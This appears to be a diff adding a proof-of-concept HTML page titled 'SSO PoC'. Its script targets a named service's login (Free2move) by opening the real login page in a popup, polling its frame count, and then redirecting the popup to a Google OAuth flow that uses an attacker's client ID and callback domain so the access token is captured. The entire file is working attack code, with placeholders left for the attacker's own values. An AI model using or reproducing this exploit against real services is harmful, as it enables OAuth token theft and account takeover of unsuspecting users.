@@ -1,0 +1,51 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>SSO PoC</title>
+  <script>
+  (function(){
+    // 1) Read the target Free2move login URL from ?url=
+    const target = new URLSearchParams(location.search).get('url');
+    if (!target) {
+      document.body.textContent = 'Missing ?url parameter.';
+      return;
+    }
+
+    // 2) Open the real login page in a popup
+    const popup = window.open(target, 'sso_login', 'width=600,height=800');
+
+    // 3) Prepare attacker OAuth redirect
+    const attackerClientId = 'YOUR_ATTACKER_CLIENT_ID';
+    const attackerRedirect = 'https://YOUR_CALLBACK_DOMAIN/callback.html';
+    const authUrl = [
+      'https://accounts.google.com/o/oauth2/v2/auth',
+      `?client_id=${attackerClientId}`,
+      `&redirect_uri=${encodeURIComponent(attackerRedirect)}`,
+      `&response_type=token`,
+      `&scope=email%20profile`,
+      `&prompt=select_account`
+    ].join('');
+
+    // 4) Poll the popup’s frame count until it looks like Google’s flow
+    const tid = setInterval(() => {
+      try {
+        const frames = popup.frames.length;
+        console.log('frames=', frames);
+        // Google’s embedded flow typically spawns 2+ frames
+        if (frames >= 2) {
+          clearInterval(tid);
+          // hijack the OAuth flow
+          popup.location.replace(authUrl);
+        }
+      } catch (e) {
+        // cross-origin errors are fine; keep polling
+      }
+    }, 300);
+  })();
+  </script>
+</head>
+<body>
+  <p>Launching SSO…</p>
+</body>
+</html>
